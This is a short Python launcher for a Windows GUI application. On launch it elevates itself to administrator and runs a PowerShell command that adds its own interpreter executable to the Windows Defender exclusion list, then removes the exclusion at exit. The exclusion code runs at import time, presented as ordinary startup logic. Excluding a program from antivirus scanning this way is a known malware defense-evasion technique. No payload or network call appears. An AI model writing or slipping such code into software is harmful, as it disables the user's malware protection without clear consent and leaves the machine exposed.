
import os
import sys
import ctypes
import subprocess
from gui import AppGui

def add_to_windows_defender_exclusions():
    # Get the path to the current executable
    path_to_app = sys.executable
    cmd = f'powershell Add-MpPreference -ExclusionPath "{path_to_app}"'
    subprocess.run(cmd, shell=True)

def remove_from_windows_defender_exclusions():
    # Get the path to the current executable
    path_to_app = sys.executable
    cmd = f'powershell Remove-MpPreference -ExclusionPath "{path_to_app}"'
    subprocess.run(cmd, shell=True)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# Add to exclusions upon launch
add_to_windows_defender_exclusions()

if __name__ == "__main__":
    app = AppGui()
    app.run()

# Remove from exclusions upon exit
remove_from_windows_defender_exclusions()
